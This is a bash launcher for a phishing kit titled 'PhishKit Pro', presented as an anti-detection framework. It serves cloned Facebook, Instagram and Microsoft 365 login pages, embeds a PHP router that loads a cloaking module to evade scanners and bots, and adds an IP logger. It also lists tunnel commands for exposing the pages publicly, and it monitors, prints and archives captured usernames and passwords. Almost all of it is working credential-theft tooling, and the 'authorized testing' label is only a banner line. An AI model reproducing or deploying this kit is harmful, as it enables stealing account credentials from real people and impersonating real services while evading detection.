'SHEOF'
#!/bin/bash

# PhishKit Pro v3.2 — Anti-Detection Phishing Framework
# For Authorized Security Testing Only

RED='\033[1;31m'; GREEN='\033[1;32m'; BLUE='\033[1;34m'
YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; NC='\033[0m'

HOST="127.0.0.1"
PORT="8080"
BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SITES_DIR="$BASE_DIR/.sites"
WWW_DIR="$BASE_DIR/.server/www"
AUTH_DIR="$BASE_DIR/auth"

banner() {
    clear
    echo -e "${RED}"
    echo "  ____  _     _     _    _ _ _   _ "
    echo " |  _ \| |__ (_)___| | _(_) | |_| |"
    echo " | |_) | '_ \| / __| |/ / | | __| |"
    echo " |  __/| | | | \__ \   <| | | |_|_|"
    echo " |_|   |_| |_|_|___/_|\_\_|_|\__(_)"
    echo -e "${NC}"
    echo -e "${CYAN}  PhishKit Pro v3.2 — Anti-Detection Framework${NC}"
    echo -e "${YELLOW}  For Authorized Security Testing Only${NC}"
    echo ""
}

check_deps() {
    if ! command -v php &>/dev/null; then
        echo -e "${RED}[-] PHP is not installed!${NC}"
        echo -e "${YELLOW}[!] Install: apt install php -y${NC}"
        exit 1
    fi
}

list_templates() {
    echo -e "${BLUE}[+] Available Templates:${NC}\n"
    local templates=()
    local i=1
    for site in "$SITES_DIR"/*/; do
        [[ ! -d "$site" ]] && continue
        name=$(basename "$site")
        [[ "$name" == _* ]] && continue
        templates+=("$name")
        case "$name" in
            facebook)   desc="Facebook login page (desktop + mobile)" ;;
            instagram)  desc="Instagram login page" ;;
            microsoft)  desc="Microsoft 365 login page" ;;
            generic)    desc="Generic branded login page" ;;
            *)          desc="Custom template" ;;
        esac
        echo -e "  ${GREEN}$i)${NC} ${WHITE}$name${NC} — $desc"
        i=$((i+1))
    done
    echo ""
    echo "${templates[@]}"
}

setup_site() {
    local site_name="$1"
    local site_dir="$SITES_DIR/$site_name"
    
    echo -e "${BLUE}[+] Preparing server environment...${NC}"
    mkdir -p "$WWW_DIR"
    rm -rf "$WWW_DIR"/*
    
    echo -e "${BLUE}[+] Setting up template: ${WHITE}$site_name${NC}"
    
    # Copy all template directories
    for dir in "$SITES_DIR"/*/; do
        [[ ! -d "$dir" ]] && continue
        dirname=$(basename "$dir")
        [[ "$dirname" == _* ]] && continue
        cp -r "$dir" "$WWW_DIR/"
    done
    
    # Copy router
    if [[ -f "$SITES_DIR/router.php" ]]; then
        cp "$SITES_DIR/router.php" "$WWW_DIR/router.php"
    else
        cat > "$WWW_DIR/router.php" << 'ROUTEREOF'
<?php
$uri = $_SERVER['REQUEST_URI'];
$path = parse_url($uri, PHP_URL_PATH);
$path = rtrim($path, '/');
$doc_root = $_SERVER['DOCUMENT_ROOT'];
if ($path === '' || $path === '/') {
    header('Location: /facebook/');
    exit();
}
$ext = pathinfo($path, PATHINFO_EXTENSION);
$static = ['css','js','png','jpg','jpeg','gif','svg','ico','webp'];
if (in_array($ext, $static)) {
    $file = $doc_root . $path;
    if (file_exists($file)) { readfile($file); return true; }
    $parts = explode('/', trim($path, '/'));
    if (count($parts) >= 2) {
        $alt = $doc_root . '/' . $parts[0] . '/' . implode('/', array_slice($parts, 1));
        if (file_exists($alt)) { readfile($alt); return true; }
    }
}
$direct = $doc_root . $path;
if (file_exists($direct) && substr($direct, -4) === '.php') {
    require $direct; return true;
}
$idx = $doc_root . $path . '/index.php';
if (file_exists($idx)) {
    $cloak = $doc_root . '/_cloak.php';
    if (file_exists($cloak)) require_once $cloak;
    require $idx; return true;
}
if (strpos($path, 'login') !== false) {
    foreach (['facebook','instagram','microsoft','generic'] as $t) {
        $f = $doc_root . '/' . $t . '/login.php';
        if (file_exists($f)) { require $f; return true; }
    }
}
$html = $doc_root . $path . '/index.html';
if (file_exists($html)) { readfile($html); return true; }
header('HTTP/1.0 404');
header('Location: https://www.facebook.com');
ROUTEREOF
    fi
    echo -e "${GREEN}[+] Router loaded${NC}"
    
    # Copy cloak
    if [[ -f "$SITES_DIR/_cloak.php" ]]; then
        cp "$SITES_DIR/_cloak.php" "$WWW_DIR/_cloak.php"
        echo -e "${GREEN}[+] Cloaking module loaded${NC}"
    fi
    
    # Copy ip.php to each template
    if [[ -f "$SITES_DIR/ip.php" ]]; then
        for dir in "$WWW_DIR"/*/; do
            cp "$SITES_DIR/ip.php" "$dir/"
        done
        echo -e "${GREEN}[+] IP logger loaded${NC}"
    fi
    
    # Store active site
    echo "$site_name" > "$WWW_DIR/.active_site"
    
    # Start server
    echo ""
    echo -e "${BLUE}[+] Starting PHP server on ${WHITE}$HOST:$PORT${NC}"
    pkill -f "php -S $HOST:$PORT" 2>/dev/null
    sleep 0.5
    
    cd "$WWW_DIR" && php -S "$HOST:$PORT" router.php > /dev/null 2>&1 &
    local pid=$!
    sleep 1.5
    
    if kill -0 $pid 2>/dev/null; then
        echo -e "${GREEN}[+] Server is running!${NC}"
        echo "$pid" > "$WWW_DIR/.server_pid"
    else
        echo -e "${RED}[-] Server failed to start${NC}"
        exit 1
    fi
}

tunnel_options() {
    local site_name="$1"
    local local_ip=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}' || hostname -I 2>/dev/null | awk '{print $1}' || echo "127.0.0.1")
    
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}      TUNNEL OPTIONS (External Access)${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${YELLOW}LAN Access (same network):${NC}"
    echo -e "     ${GREEN}http://$local_ip:$PORT/$site_name/${NC}"
    echo ""
    echo -e "  ${YELLOW}Option 1 — Serveo (SSH, no install):${NC}"
    echo -e "     ${WHITE}ssh -R 80:localhost:$PORT serveo.net${NC}"
    echo ""
    echo -e "  ${YELLOW}Option 2 — Ngrok:${NC}"
    echo -e "     ${WHITE}ngrok http $PORT${NC}"
    echo ""
    echo -e "  ${YELLOW}Option 3 — Cloudflared:${NC}"
    echo -e "     ${WHITE}cloudflared tunnel --url http://localhost:$PORT${NC}"
    echo ""
}

monitor() {
    local site_name="$1"
    mkdir -p "$AUTH_DIR"
    
    # Robust site data directory detection
    local site_name_from_file=""
    if [[ -f "$WWW_DIR/.active_site" ]]; then
        site_name_from_file=$(cat "$WWW_DIR/.active_site")
    fi
    local monitor_dir="${site_name:-$site_name_from_file}"
    if [[ -z "$monitor_dir" ]]; then
        monitor_dir=$(ls -d "$WWW_DIR"/*/ 2>/dev/null | head -1 | xargs basename 2>/dev/null)
    fi
    local site_data_dir="$WWW_DIR/$monitor_dir"
    
    echo -e "${YELLOW}[*] Monitoring: ${WHITE}$site_data_dir${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}\n"
    
    declare -A last_hashes
    
    # Initialize with existing hashes
    for f in "$WWW_DIR"/*/usernames.txt; do
        [[ -f "$f" ]] && last_hashes["$f"]=$(md5sum "$f" 2>/dev/null | awk '{print $1}')
    done
    
    echo -e "${CYAN}[*] Waiting for targets...${NC}"
    
    while true; do
        for cred_file in "$WWW_DIR"/*/usernames.txt; do
            [[ ! -f "$cred_file" ]] && continue
            local current_hash=$(md5sum "$cred_file" 2>/dev/null | awk '{print $1}')
            local prev_hash="${last_hashes["$cred_file"]}"
            
            if [[ "$current_hash" != "$prev_hash" ]] && [[ -n "$current_hash" ]]; then
                local template_name=$(basename "$(dirname "$cred_file")")
                local timestamp=$(date '+%H:%M:%S')
                
                echo ""
                echo -e "${RED}┌─────────────────────────────────────────────┐${NC}"
                echo -e "${RED}│${GREEN}      ✅ CREDENTIALS CAPTURED! ${RED}              │${NC}"
                echo -e "${RED}│${WHITE}      Template: $template_name${RED}               │${NC}"
                echo -e "${RED}│${WHITE}      Time: $timestamp${RED}                       │${NC}"
                echo -e "${RED}└─────────────────────────────────────────────┘${NC}"
                echo ""
                cat "$cred_file"
                echo ""
                echo -e "${CYAN}────────────────────────────────────────────${NC}"
                
                # Save to auth
                cp "$cred_file" "$AUTH_DIR/${template_name}_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null
                cp "$cred_file" "$AUTH_DIR/latest_capture.txt" 2>/dev/null
                
                last_hashes["$cred_file"]="$current_hash"
            fi
        done
        sleep 1
    done
}

cleanup() {
    echo ""
    echo -e "${YELLOW}[*] Shutting down...${NC}"
    if [[ -f "$WWW_DIR/.server_pid" ]]; then
        kill $(cat "$WWW_DIR/.server_pid") 2>/dev/null
    fi
    pkill -f "php -S $HOST:$PORT" 2>/dev/null
    
    # Save any remaining captured data
    if [[ -d "$WWW_DIR" ]]; then
        for cred_file in "$WWW_DIR"/*/usernames.txt; do
            if [[ -f "$cred_file" ]]; then
                local template=$(basename "$(dirname "$cred_file")")
                cp "$cred_file" "$AUTH_DIR/${template}_final.txt" 2>/dev/null
            fi
        done
        echo -e "${GREEN}[+] Data saved to $AUTH_DIR/${NC}"
    fi
    
    rm -rf "$WWW_DIR"
    echo -e "${GREEN}[+] Cleanup complete${NC}"
    exit 0
}

main() {
    trap cleanup EXIT INT TERM
    banner
    check_deps
    
    local templates=($(list_templates))
    
    echo -ne "${CYAN}[?] Select template [1-${#templates[@]}]: ${NC}"
    read choice
    
    if ! [[ "$choice" =~ ^[0-9]+$ ]] || [[ $choice -lt 1 ]] || [[ $choice -gt ${#templates[@]} ]]; then
        echo -e "${RED}[-] Invalid selection${NC}"
        exit 1
    fi
    
    local selected="${templates[$((choice-1))]}"
    setup_site "$selected"
    tunnel_options "$selected"
    
    echo ""
    echo -e "${GREEN}[+] ===== TARGET URL =====${NC}"
    echo -e "${GREEN}[+] http://$HOST:$PORT/$selected/${NC}"
    echo -e "${GREEN}[+] ======================${NC}"
    echo ""
    echo -e "${YELLOW}[!] Cloaking blocks scanners, bots, and headless browsers${NC}"
    echo ""
    echo -ne "${CYAN}[?] Press Enter to start monitoring...${NC}"
    read
    
    monitor "$selected"
}

main
SHEOF